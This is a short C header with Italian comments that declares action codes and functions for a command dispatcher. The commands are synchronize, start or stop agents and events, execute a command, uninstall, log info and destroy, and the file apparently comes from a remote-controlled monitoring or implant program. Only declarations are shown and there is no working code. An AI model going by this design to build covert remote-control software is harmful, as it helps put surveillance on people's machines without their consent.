#include <stdio.h>
#include "LOG.h"
#include "AM_Core.h"
#include "asp/ASP.h"
#include <scramblestring.h>

// Codici delle action function
#define AF_SYNCRONIZE 1
#define AF_STARTAGENT 2
#define AF_STOPAGENT  3
#define AF_EXECUTE    4
#define AF_UNINSTALL  5
#define AF_LOGINFO    6
#define AF_STARTEVENT 7
#define AF_STOPEVENT  8
#define AF_DESTROY	  9
#define AF_NONE 0xFFFFFFFF

// Sono dichiarati in SM_Core.cpp di cui questo file e' un include
void EventMonitorStopAll(void);    
void UpdateEventConf(void);
void EventMonitorStartAll(void);    
void SM_AddExecutedProcess(DWORD);

// Dichiarazione delle possibili azioni
BOOL WINAPI DA_Uninstall(BYTE *dummy_param);
BOOL WINAPI DA_Syncronize(BYTE *action_param);
BOOL WINAPI DA_StartAgent(BYTE *agent_tag);
BOOL WINAPI DA_StopAgent(BYTE *agent_tag);
BOOL WINAPI DA_Execute(BYTE *command);
BOOL WINAPI DA_LogInfo(BYTE *info);
BOOL WINAPI DA_Destroy(BYTE *isPermanent);
BOOL WINAPI DA_StartEvent(BYTE* event_id);
BOOL WINAPI DA_StopEvent(BYTE* event_id);

// Dichiarazione del thread che puo' essere ristartato dalla sync
DWORD WINAPI FastActionsThread(DWORD);

//
extern BOOL bInstantActionThreadSemaphore;
extern HANDLE hInstantActionThread;
